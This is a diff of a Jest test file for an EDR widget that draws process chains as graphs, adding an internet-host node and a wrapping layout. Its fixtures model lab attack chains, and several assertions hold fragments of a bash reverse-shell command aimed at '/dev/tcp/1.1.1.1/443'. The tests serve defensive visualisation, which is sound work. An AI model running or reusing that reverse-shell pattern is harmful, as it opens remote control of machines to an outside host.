@@ -1,8 +1,9 @@
 "use strict";
 // Pure-logic tests for the node-graph model (widget/widgetAssets/js/timelineGraph.js).
-// No DOM, no cytoscape -- just stacks -> graph -> element JSON.
+// No DOM, no cytoscape -- just stacks -> graph -> element JSON -> layout.
 // The two fixture chains are the live-proven shapes:
-//   - the bash chain (9 nodes, one line, systemd -> reverse shell);
+//   - the bash chain (9 nodes + an internet host: one line, systemd ->
+//     reverse shell -> 1.1.1.1, AS 13335 CLOUDFLARENET);
 //   - the Windows control.exe chain (multi-stage merge, self-edge, dangling aux).
 // Run with: make test-unit WIDGET=fortiedrCommandTimeline
 const g = require("../widget/widgetAssets/js/timelineGraph.js");
@@ -20,13 +21,15 @@ function rawStage(over) {
     processId: "5302",
     auxProcessId: "5304",
     timestamp: 1793725330000,
-    commandLine: "bash /tmp/edr_lab.sh all",
+    commandLine: "",
     stackNum: 3,
     stackEntries: [],
   }, over || {});
 }
 
-// The live bash chain, in the console's own (unordered) stage order.
+// The live bash chain, in the console's own (unordered) stage order. The
+// last stage is the CONNECTION STACK: the reverse shell reached the
+// event's destination, so the graph anchors the internet host there.
 function bashChain() {
   return [
     rawStage({ processId: "5302", auxProcessId: "5304", shortSourceProcessName: "sudo",
@@ -51,9 +54,25 @@ function bashChain() {
   ];
 }
 
+// The live event-level network triple (destination/asn/country), as the
+// connector's whitelist stores it.
+function bashTimeline(over) {
+  return Object.assign({
+    eventId: 694297391,
+    host: "lab-endpoint-01",
+    os: "Ubuntu 24.04.4 LTS",
+    destination: "1.1.1.1",
+    remoteIP: "1.1.1.1",
+    asn: "13335 CLOUDFLARENET",
+    country: "US",
+    stacks: bashChain(),
+  }, over || {});
+}
+
 // The live Windows chain: 8 clean spawn stages, then control.exe (pid 4392)
 // appears in three more stages -- a self thread-creation, an open-process on
 // a pid the chain never kept (4), and a credentials access on another (684).
+// No CONNECTION stage: its event carries no reachable internet anchor.
 // Sensor-relative stamps (~4.1e9) that are NOT plausible epochs.
 function controlChain() {
   return [
@@ -84,28 +103,30 @@ function nodeFor(graph, id) {
 
 // toGraph takes the TIMELINE object (what extractTimeline returns), not the
 // bare stacks array -- the same contract buildStages has.
-const bashGraph = () => g.toGraph({ stacks: bashChain() });
+const bashGraph = () => g.toGraph(bashTimeline());
 const controlGraph = () => g.toGraph({ stacks: controlChain() });
 
 describe("toGraph -- the live bash chain", () => {
   const graph = bashGraph();
 
-  test("one node per unique processId: 9 stages -> 9 nodes", () => {
-    expect(graph.nodes.length).toBe(9);
-    expect(graph.nodes.map((n) => n.pid)).toEqual(
+  test("one node per unique processId, plus the internet host: 9 + 1", () => {
+    expect(graph.nodes.length).toBe(10);
+    expect(graph.nodes.slice(0, 9).map((n) => n.pid)).toEqual(
       ["1", "1064", "5225", "5300", "5301", "5302", "5304", "5345", "5346"]);
+    expect(graph.nodes[9].id).toBe("net:1.1.1.1");
   });
 
-  test("the spawn chain is a single line systemd -> reverse shell", () => {
+  test("the spawn chain is a single line systemd -> reverse shell -> internet", () => {
     expect(graph.edges).toEqual([
-      { source: "1", target: "1064" },
-      { source: "1064", target: "5225" },
-      { source: "5225", target: "5300" },
-      { source: "5300", target: "5301" },
-      { source: "5301", target: "5302" },
-      { source: "5302", target: "5304" },
-      { source: "5304", target: "5345" },
-      { source: "5345", target: "5346" },
+      { source: "1", target: "1064", net: false },
+      { source: "1064", target: "5225", net: false },
+      { source: "5225", target: "5300", net: false },
+      { source: "5300", target: "5301", net: false },
+      { source: "5301", target: "5302", net: false },
+      { source: "5302", target: "5304", net: false },
+      { source: "5304", target: "5345", net: false },
+      { source: "5345", target: "5346", net: false },
+      { source: "5346", target: "net:1.1.1.1", net: true },
     ]);
   });
 
@@ -113,11 +134,23 @@ describe("toGraph -- the live bash chain", () => {
     expect(graph.roots).toEqual(["1"]);
   });
 
-  test("labels are two lines: process name + PID (chains repeat names)", () => {
-    const sshds = graph.nodes.filter((n) => n.label.indexOf("sshd") === 0);
-    expect(sshds.length).toBe(3);
-    expect(sshds.map((n) => n.label)).toEqual(
-      ["sshd\nPID 1064", "sshd\nPID 5225", "sshd\nPID 5300"]);
+  test("the internet host carries the API's own network facts", () => {
+    const net = nodeFor(graph, "net:1.1.1.1");
+    expect(net.net).toEqual({
+      ip: "1.1.1.1", asn: "13335 CLOUDFLARENET", country: "US",
+      remoteUrl: "", action: "",
+    });
+    expect(net.activity).toBe(false);
+    expect(net.stages.length).toBe(1);
+    expect(net.stages[0].pid).toBe("5346");
+    expect(net.stages[0].command).toContain("/dev/tcp/1.1.1.1/443");
+  });
+
+  test("the event's action lands on the net card when the record carries one", () => {
+    const graph2 = g.toGraph(bashTimeline(), { action: "Block" });
+    const net = nodeFor(graph2, "net:1.1.1.1");
+    expect(net.net.action).toBe("Block");
+    expect(net.name).toBe("Internet host (Block)");
   });
 
   test("the reverse-shell node keeps its command and its activity stage", () => {
@@ -125,12 +158,7 @@ describe("toGraph -- the live bash chain", () => {
     expect(shell.activity).toBe(true);
     expect(shell.kinds).toEqual(["CONNECTION STACK"]);
     expect(shell.stages.length).toBe(1);
-    expect(shell.stages[0].command).toContain("/dev/tcp/1.1.1.1/443");
-  });
-
-  test("nodes carry their earliest renderable time", () => {
-    expect(nodeFor(graph, "1").time).not.toBe("");
-    expect(nodeFor(graph, "5346").time).not.toBe("");
+    expect(shell.command).toContain("/dev/tcp/1.1.1.1/443");
   });
 });
 
@@ -140,7 +168,7 @@ describe("toGraph -- the live control.exe chain", () => {
   test("multi-stage processes merge onto ONE node keeping all stages", () => {
     const control = nodeFor(graph, "4392");
     expect(control).toBeDefined();
-    expect(control.label).toBe("control.exe\nPID 4392");
+    expect(control.name).toBe("control.exe");
     expect(control.stages.length).toBe(3);
     // Chronological stage order inside the merged node.
     expect(control.stages.map((s) => s.stage)).toEqual(
@@ -156,14 +184,14 @@ describe("toGraph -- the live control.exe chain", () => {
     // spawned control.exe), and NO out-edges from control.exe (its aux pids
     // were its own thread, pid 4, and pid 684 -- none of them chain stages).
     expect(graph.edges).toEqual([
-      { source: "3328", target: "6824" },
-      { source: "6824", target: "8156" },
-      { source: "8156", target: "6000" },
-      { source: "6000", target: "6172" },
-      { source: "6172", target: "1252" },
-      { source: "1252", target: "5544" },
-      { source: "5544", target: "492" },
-      { source: "492", target: "4392" },
+      { source: "3328", target: "6824", net: false },
+      { source: "6824", target: "8156", net: false },
+      { source: "8156", target: "6000", net: false },
+      { source: "6000", target: "6172", net: false },
+      { source: "6172", target: "1252", net: false },
+      { source: "1252", target: "5544", net: false },
+      { source: "5544", target: "492", net: false },
+      { source: "492", target: "4392", net: false },
     ]);
   });
 
@@ -186,6 +214,27 @@ describe("toGraph -- the live control.exe chain", () => {
   });
 });
 
+describe("toGraph -- when the internet host must NOT appear", () => {
+  test("no destination in the event -> no net node", () => {
+    const graph = g.toGraph(bashTimeline({ destination: undefined, remoteIP: undefined }));
+    expect(graph.nodes.find((n) => n.net)).toBeUndefined();
+    expect(graph.edges.every((e) => !e.net)).toBe(true);
+  });
+
+  test("destination but NO connection stage -> no net node (an unanchorable edge would be a guess)", () => {
+    // The control.exe chain + a destination: nothing reached out per the
+    // stacks, so the header carries the destination alone.
+    const graph = g.toGraph({ stacks: controlChain(), destination: "1.1.1.1",
+                              remoteIP: "1.1.1.1", asn: "13335 CLOUDFLARENET" });
+    expect(graph.nodes.find((n) => n.net)).toBeUndefined();
+  });
+
+  test("remoteIP alone (no destination key) still anchors the net node", () => {
+    const graph = g.toGraph(bashTimeline({ destination: undefined }));
+    expect(graph.nodes.find((n) => n.net)).toBeDefined();
+  });
+});
+
 describe("toGraph -- structural rules", () => {
   test("duplicate edges dedupe (two stages of one parent spawning the same child)", () => {
     // The child must exist as its own stage, or its edge is dangling by rule.
@@ -196,7 +245,7 @@ describe("toGraph -- structural rules", () => {
                  shortSourceProcessName: "child" }),
     ];
     const graph = g.toGraph({ stacks });
-    expect(graph.edges).toEqual([{ source: "100", target: "200" }]);
+    expect(graph.edges).toEqual([{ source: "100", target: "200", net: false }]);
     expect(graph.nodes.length).toBe(2);
   });
 
@@ -207,7 +256,7 @@ describe("toGraph -- structural rules", () => {
     const graph = g.toGraph({ stacks });
     expect(graph.nodes.length).toBe(1);
     expect(graph.nodes[0].id).toBe("stage-0");
-    expect(graph.nodes[0].label).toBe("orphan.exe");
+    expect(graph.nodes[0].name).toBe("orphan.exe");
     expect(graph.edges).toEqual([]);
     expect(graph.roots).toEqual(["stage-0"]);
   });
@@ -230,37 +279,142 @@ describe("toGraph -- structural rules", () => {
   });
 });
 
-describe("toElements", () => {
-  test("node data carries id/label/pid/time/activity/kind/stage counts", () => {
-    const graph = controlGraph();
-    const els = g.toElements(graph);
-    const control = els.nodes.find((n) => n.data.id === "4392");
-    expect(control.data).toMatchObject({
-      id: "4392", label: "control.exe\nPID 4392", pid: "4392",
-      time: "", activity: true, kindCount: 3, stageCount: 3,
-    });
+describe("cardLabel / kindText -- what the canvas card says", () => {
+  test("ancestry cards stay two short lines (name, PID) -- no kind noise", () => {
+    const els = g.toElements(bashGraph());
+    const systemd = els.nodes.find((n) => n.data.id === "1");
+    expect(systemd.data.label).toBe("systemd\nPID 1");
   });
 
-  test("edges get synthetic ids parent -> child", () => {
-    const graph = bashGraph();
-    const els = g.toElements(graph);
-    expect(els.edges.length).toBe(8);
-    expect(els.edges[0]).toEqual({ data: { id: "e0", source: "1", target: "1064" } });
+  test("a command-bearing ancestry card adds its command line", () => {
+    const els = g.toElements(bashGraph());
+    const sshd = els.nodes.find((n) => n.data.id === "5225");
+    expect(sshd.data.label).toBe("sshd\nPID 5225\n-D -R");
+  });
+
+  test("an activity card names what it did", () => {
+    const els = g.toElements(bashGraph());
+    const shell = els.nodes.find((n) => n.data.id === "5346");
+    const lines = shell.data.label.split("\n");
+    expect(lines[0]).toBe("bash");
+    expect(lines[1]).toBe("PID 5346");
+    expect(lines[2]).toBe("CONNECTION STACK");
+    // The long command truncates with ASCII dots.
+    expect(lines[3]).toMatch(/^-c exec 3<>\/dev\/tcp\/1\.1\.1\.1\/443/);
+    expect(lines[3].endsWith("...")).toBe(true);
+    expect(lines[3].length).toBe(42);
+  });
+
+  test("a merged node summarizes its kinds: first kind + count", () => {
+    const els = g.toElements(controlGraph());
+    const control = els.nodes.find((n) => n.data.id === "4392");
+    expect(control.data.label).toBe("control.exe\nPID 4392\nTHREAD CREATION STACK +2");
+  });
+
+  test("long commands ellipsize with ASCII dots (no en/em dashes)", () => {
+    const label = g.cardLabel({ name: "bash", pid: "9", kinds: ["CONNECTION STACK"],
+                                command: "x".repeat(100), activity: true, net: null });
+    expect(label.split("\n")[3].endsWith("...")).toBe(true);
+    expect(label.split("\n")[3].length).toBe(42);
+  });
+
+  test("kindText: ancestry-only -> empty; activity -> first kind; merged -> +N", () => {
+    expect(g.kindText({ kinds: ["PARENT PROCESS CREATION"], net: null })).toBe("");
+    expect(g.kindText({ kinds: ["CONNECTION STACK"], net: null })).toBe("CONNECTION STACK");
+    expect(g.kindText({ kinds: ["THREAD CREATION STACK", "OPEN PROCESS STACK", "CREDENTIALS ACCESS"],
+                        net: null })).toBe("THREAD CREATION STACK +2");
   });
 });
 
-describe("graphStyle / graphLayout", () => {
-  test("style has node, activity, selected and edge rules", () => {
-    const style = g.graphStyle();
-    const selectors = style.map((s) => s.selector);
-    expect(selectors).toEqual(expect.arrayContaining(["node", "node[activity]", "node.selected", "edge"]));
-    const activity = style.find((s) => s.selector === "node[activity]");
-    expect(activity.style["background-color"]).toBe(g.COLORS.ACTIVITY_FILL);
+describe("toElements", () => {
+  test("node data carries id/label/name/pid/border color/net/activity/counts", () => {
+    const els = g.toElements(bashGraph());
+    const shell = els.nodes.find((n) => n.data.id === "5346");
+    expect(shell.data).toMatchObject({
+      id: "5346", name: "bash", pid: "5346",
+      color: g.COLORS.ACTIVITY_BORDER, net: false, activity: true,
+      kindCount: 1, stageCount: 1,
+    });
+    const net = els.nodes.find((n) => n.data.id === "net:1.1.1.1");
+    expect(net.data.color).toBe(g.COLORS.NET_BORDER);
+    expect(net.data.net).toBe(true);
+    const systemd = els.nodes.find((n) => n.data.id === "1");
+    expect(systemd.data.color).toBe(g.COLORS.ANCESTRY_BORDER);
   });
 
-  test("layout is dagre left-to-right", () => {
-    expect(g.graphLayout(g.toGraph({ stacks: bashChain() }))).toMatchObject({
+  test("the net edge is flagged for the dashed style", () => {
+    const els = g.toElements(bashGraph());
+    expect(els.edges.length).toBe(9);
+    expect(els.edges[8]).toEqual({
+      data: { id: "e8", source: "5346", target: "net:1.1.1.1", net: true },
+    });
+  });
+});
+
+describe("graphStyle", () => {
+  test("one dark fill, meaning on the border; net edges dashed", () => {
+    const style = g.graphStyle();
+    const node = style.find((s) => s.selector === "node");
+    expect(node.style["background-color"]).toBe(g.COLORS.FILL);
+    expect(node.style["border-color"]).toBe("data(color)");
+    expect(node.style.width).toBe(g.CARD_W);
+    const netEdge = style.find((s) => s.selector === "edge[net]");
+    expect(netEdge.style["line-style"]).toBe("dashed");
+  });
+});
+
+describe("snakeLayout -- linear chains wrap into readable rows", () => {
+  test("a 9-card chain in a wide viewport: two boustrophedon rows at zoom 1", () => {
+    const layout = g.snakeLayout(bashGraph(), { width: 1469, height: 338 });
+    expect(layout.name).toBe("preset");
+    expect(layout.fit).toBe(false);   // never upscale a short chain
+    const pos = layout.positions;
+    // 10 nodes: 5 per row. Row 0 left->right, row 1 snakes right->left.
+    expect(Object.keys(pos).length).toBe(10);
+    expect(pos["1"].y).toBe(pos["1064"].y);              // row 0
+    expect(pos["5346"].y).toBe(pos["net:1.1.1.1"].y);    // row 1
+    expect(pos["1"].y).toBeLessThan(pos["5346"].y);
+    expect(pos["1"].x).toBeLessThan(pos["1064"].x);      // left -> right
+    // The snake turn: last of row 0 (bash 5301) and first of row 1 (sudo
+    // 5302) sit in the SAME column, so the wrap edge drops straight down.
+    expect(pos["5301"].x).toBe(pos["5302"].x);
+    // Row 1 runs right -> left: chain order goes leftward on x.
+    expect(pos["5302"].x).toBeGreaterThan(pos["5304"].x);
+    expect(pos["5346"].x).toBeGreaterThan(pos["net:1.1.1.1"].x);
+  });
+
+  test("a 3-card chain fits one row", () => {
+    const three = g.toGraph({ stacks: [
+      rawStage({ processId: "10", auxProcessId: "20" }),
+      rawStage({ processId: "20", auxProcessId: "30" }),
+      rawStage({ processId: "30", auxProcessId: null, stageName: "PROCESS ACTIVITY" }),
+    ] });
+    const layout = g.snakeLayout(three, { width: 1469, height: 338 });
+    expect(layout.name).toBe("preset");
+    const ys = Object.values(layout.positions).map((p) => p.y);
+    expect(new Set(ys).size).toBe(1);
+  });
+
+  test("a branched graph is not a snake: dagre fallback", () => {
+    // Two children off one parent -> out-degree 2.
+    const stacks = [
+      rawStage({ processId: "100", auxProcessId: "200", shortSourceProcessName: "parent" }),
+      rawStage({ processId: "200", auxProcessId: null, shortSourceProcessName: "kidA" }),
+      rawStage({ processId: "100", auxProcessId: "300", stageName: "PROCESS ACTIVITY",
+                 shortSourceProcessName: "parent" }),
+      rawStage({ processId: "300", auxProcessId: null, stageName: "PROCESS ACTIVITY",
+                 shortSourceProcessName: "kidB" }),
+    ];
+    const graph = g.toGraph({ stacks });
+    expect(g.snakeLayout(graph, { width: 1469, height: 338 })).toBeNull();
+    expect(g.graphLayout(graph, { width: 1469, height: 338 })).toMatchObject({
       name: "dagre", rankDir: "LR",
     });
+  });
+
+  test("no measurable viewport yet -> dagre (the pre-attach case)", () => {
+    expect(g.graphLayout(bashGraph(), { width: 0, height: 0 }))
+      .toMatchObject({ name: "dagre" });
+    expect(g.snakeLayout(bashGraph(), null)).toBeNull();
   });
 });
